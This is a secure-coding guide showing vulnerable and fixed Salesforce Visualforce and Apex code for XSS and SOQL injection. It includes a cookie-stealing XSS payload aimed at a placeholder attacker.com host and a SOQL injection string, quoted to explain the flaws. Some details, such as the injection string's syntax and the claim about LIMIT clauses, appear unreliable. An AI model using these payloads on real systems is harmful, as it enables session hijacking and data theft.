# Examples — XSS and Injection Prevention

## Example 1: JSENCODE Missing in Visualforce JavaScript Block

**Context:** A Visualforce page displays an Account record and passes the Account Name to a JavaScript function for a third-party analytics integration. The page has been working fine for standard account names but a security review flagged it.

**Problem:** The page uses `{!account.Name}` directly inside a `<script>` block. An attacker who can edit the Account Name (or injects data via an API) can store a value like `'; document.location='https://attacker.com?c='+document.cookie+'` to steal session cookies.

**Solution:**
```html
<!-- BEFORE: vulnerable -->
<script>
    var acctName = '{!account.Name}';
    thirdPartyAnalytics.track(acctName);
</script>

<!-- AFTER: safe -->
<script>
    var acctName = '{!JSENCODE(account.Name)}';
    thirdPartyAnalytics.track(acctName);
</script>
```

**Why it works:** `JSENCODE()` escapes characters that have special meaning in JavaScript string literals (backslash, quotes, newlines, Unicode control characters). The attacker's injected single quote is encoded to `\'`, breaking the escape attempt.

---

## Example 2: SOQL Injection in a Search Endpoint

**Context:** An Apex REST endpoint exposes a contact search feature used by an Experience Cloud site. The endpoint accepts a `lastName` query parameter and returns matching contacts.

**Problem:** The original implementation concatenates the parameter directly into a SOQL string. An attacker sends `lastName=Smith' OR Id != null AND (SELECT Id FROM User WHERE Profile.Name = 'System Administrator') != null AND LastName != '` to extract all contacts in the org.

**Solution:**
```apex
// BEFORE: vulnerable
@RestResource(urlMapping='/contacts/search')
global class ContactSearchEndpoint {
    @HttpGet
    global static List<Contact> search() {
        String lastName = RestContext.request.params.get('lastName');
        // VULNERABLE: direct string concatenation
        return Database.query(
            'SELECT Id, Name, Email FROM Contact WHERE LastName = \'' + lastName + '\''
        );
    }
}

// AFTER: safe using bind variable
@RestResource(urlMapping='/contacts/search')
global class ContactSearchEndpoint {
    @HttpGet
    global static List<Contact> search() {
        String lastName = RestContext.request.params.get('lastName');
        // SAFE: bind variable
        return Database.query(
            'SELECT Id, Name, Email FROM Contact WHERE LastName = :lastName'
        );
    }
}
```

**Why it works:** The bind variable `:lastName` tells the Salesforce query engine to treat the value as a string literal, regardless of what characters it contains. No amount of SQL syntax in the parameter value can modify the query structure.

---

## Anti-Pattern: Trusting escapeSingleQuotes() as Sole Protection

**What practitioners do:** Use `String.escapeSingleQuotes(userInput)` and consider the dynamic SOQL safe:

```apex
// WRONG: escapeSingleQuotes as sole protection
String safe = String.escapeSingleQuotes(userInput);
Database.query('SELECT Id FROM Account WHERE Name = \'' + safe + '\'');
```

**What goes wrong:** `String.escapeSingleQuotes()` only escapes the single-quote character. It does not handle Unicode lookalike characters, multi-byte encoding attacks, or injection patterns that do not rely on single quotes. It also does nothing for SOSL injection, second-order injection, or injection in `ORDER BY` / `LIMIT` clauses where bind variables cannot be used.

**Correct approach:** Use bind variables as the primary defense. If dynamic field names, object names, or operators must be constructed (where bind variables cannot be used), validate them against a whitelist of known-safe values before including them in the query string.
